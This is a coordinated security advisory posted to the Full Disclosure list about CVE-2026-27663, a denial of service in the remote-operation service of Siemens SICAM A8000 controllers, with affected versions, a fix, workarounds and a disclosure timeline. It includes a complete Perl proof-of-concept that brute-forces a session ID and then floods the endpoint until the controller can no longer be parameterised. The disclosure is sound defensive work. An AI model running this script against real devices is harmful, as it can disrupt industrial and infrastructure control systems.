---
title: CyberDanube Security Research 20260408-0 | Remote Operation Denial of Service in Siemens SICAM A8000
url: https://seclists.org/fulldisclosure/2026/Apr/6
source: Full Disclosure
date: 2026-04-14
fetch_date: 2026-04-15T04:44:13.831026
---

# CyberDanube Security Research 20260408-0 | Remote Operation Denial of Service in Siemens SICAM A8000

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](5)
[By Date](date.html#6)
[![Next](/images/right-icon-16x16.png)](7)

[![Previous](/images/left-icon-16x16.png)](5)
[By Thread](index.html#6)
[![Next](/images/right-icon-16x16.png)](7)

![](/shared/images/nst-icons.svg#search)

# CyberDanube Security Research 20260408-0 | Remote Operation Denial of Service in Siemens SICAM A8000

---

*From*: Thomas Weber | CyberDanube via Fulldisclosure <fulldisclosure () seclists org>
*Date*: Tue, 14 Apr 2026 10:43:15 +0000

---

```
CyberDanube Security Research 20260408-0
-------------------------------------------------------------------------------
                title| Remote Operation Denial of Service
              product| Siemens SICAM A8000 CP-8050/CP-8031/CP-8010/CP-8012
   vulnerable version| <=V25.30
        fixed version| V26.10
           CVE number| CVE-2026-27663
               impact| Medium
             homepage| https://siemens.com/
                found| 28.11.2025
                   by| T. Weber, S. Dietz, D. Blagojevic, F. Koroknai
                     | (Office Vienna)
                     | CyberDanube Security Research
                     | Vienna | St. Pölten
                     |
                     | https://www.cyberdanube.com
-------------------------------------------------------------------------------

Vendor description
-------------------------------------------------------------------------------
"Our purpose: We create technology to transform the everyday, for everyone.
By combining the real and the digital worlds, we can help accelerate both
digitalization and sustainability - so our customers around the world can
become more competitive, resilient and sustainable."

Source: https://www.siemens.com/global/en/company/about.html

Vulnerable versions
-------------------------------------------------------------------------------
Siemens SICAM A8000 CP-8050 Master Module (6MF2805-0AA00) / <=V25.30
Siemens SICAM A8000 CP-8031 Master Module (6MF2803-1AA00) / <=V25.30
Siemens SICAM A8000 CP-8010 Master Module (6MF2801-0AA00) / <=V25.31
Siemens SICAM A8000 CP-8012 Master Module (6MF2801-2AA00) / <=V25.31

See also the vendor advisory:
https://cert-portal.siemens.com/productcert/html/ssa-246443.html

Vulnerability overview
-------------------------------------------------------------------------------
1) Remote Operation Denial of Service (CVE-2026-27663)
The remote operation mode is vulnerable to an uncontrolled resource exhaustion.
By sending frequent requests, the service can be interrupted and the affected
PLC can no longer be parameterized. This vulnerabilitiy can be triggered with
less than 100 requests and stalls the service as log as it is restarted via the
web interface or if the device is rebooted.

Proof of Concept
-------------------------------------------------------------------------------
1) Remote Operation Denial of Service (CVE-2026-27663)
The following script can be used to force the CPCI85 process into a denial of
service state:
-----------------------------------------------------
#!/usr/bin/perl
#Author: T. Weber
#SICAM Remote Operation DoS <=V25.30
use strict;
use warnings;
use LWP::UserAgent;
use Parallel::ForkManager;

$ENV{'PERL_LWP_SSL_VERIFY_HOSTNAME'} = 0;
print "Enter target IP address: ";
chomp(my $ip = <STDIN>);

print "Enter target port: ";
chomp(my $port = <STDIN>);

print "Enter Y/N for HTTPS: ";
chomp(my $tls = <STDIN>);

if ($tls eq "Y") {
    $tls = "https";
} elsif ($tls eq "N") {
    $tls = "http";
} else {
    die "Invalid input for HTTPS (must be Y or N)\n";
}

my $server_endpoint = "$tls://$ip:$port/SICAM_TOOLBOX_1703_remote_connection_01.htm";
print "Testing $server_endpoint\n";
# user agent
my $ua = LWP::UserAgent->new(
    ssl_opts   => { SSL_verify_mode => 0 },
    keep_alive => 1,
    agent      => "SICAM TOOLBOX II"
);

# brute force session
my @hex = (0..9, 'A'..'F');
my $found_session;
for my $d1 (@hex) {
    for my $d2 (@hex) {
        for my $d3 (@hex) {
            for my $d4 (@hex) {
                my $session_id = "008cfd320836$d1$d2$d3$d4";
                my $req = HTTP::Request->new(POST => $server_endpoint);
                $req->header('content-type'   => 'text/plain');
                $req->header('Session-ID'     => $session_id);
                $req->header('UPLOADFILENAME' => 'abc.f20');
                $req->content('type=20&length=1&data=A');

                my $resp = $ua->request($req);

                if ($resp->is_success) {
                    print "[$session_id] OK: ", $resp->decoded_content, "\n";
                    if ($resp->decoded_content ne ""){
                                    print "found session\n";
                                    $found_session = $session_id;
                                    last;
                              }
                } else {
                    print "[$session_id] ERROR: ", $resp->status_line, "\n";
                }
            }
            if ($found_session ne ""){
                        last;
                  }
        }
        if ($found_session ne ""){
                  last;
            }
    }
    if ($found_session ne ""){
            last;
      }
}

#denial of remote operation
my $max_procs = 10;
my $pm = Parallel::ForkManager->new($max_procs);

my @alpha = (0..9);
for my $d1 (@alpha) {
    for my $d2 (@alpha) {
            $pm->start and next;
                  my $len = "$d1$d2";

            my $req = HTTP::Request->new(POST => $server_endpoint);
            $req->header('content-type'   => 'text/plain');
            $req->header('Session-ID'     => $found_session);
            $req->header('UPLOADFILENAME' => 'abc.f20');
            $req->content('type=20&length='.$len.'&data=A');
            my $resp = $ua->request($req);

            if ($resp->is_success) {
                print "DoS Running: ".$d1.$d2."\n";
            } else {
                print "ERROR: ", $resp->status_line, "\n";
            }
            $pm->finish;
    }
}
$pm->wait_all_children;
-----------------------------------------------------
The service is still running but stalled and cannot be used anymore to set
parameters via Toolbox II.

Solution
-------------------------------------------------------------------------------
Install the latest version available.

Workaround
-------------------------------------------------------------------------------
Activate the web-interface to restart the service if needed. Deactivate remote
operation if not used. Restrict network access to the device in the
infrastructure.

Recommendation
-------------------------------------------------------------------------------
CyberDanube recommends to perform a white-box security assessment of the SICAM
A8000 master module devices.

Contact Timeline
-------------------------------------------------------------------------------
2025-12-12: Contacting Siemens PSIRT. Siemens ProductCERT confirms issues.
2026-01-13: Siemens ProductCERT confirms to work on a fix.
2026-01-16: Siemens ProductCERT asks for more information regarding the
            exploitation. Provided more information.
2026-02-18: Asked for an update. Siemens ProductCERT provided a preliminary
            timeline.
2026-03-26: Siemens informs that patch has been released. Providing more time
            for customer to patch. Siemens published Advisory
2026-04-08: Coordinated release of security advisory.

Web: https://www.cyberdanube.com
Twitter: https://twitter.com/cyberdanube
Mail: researc...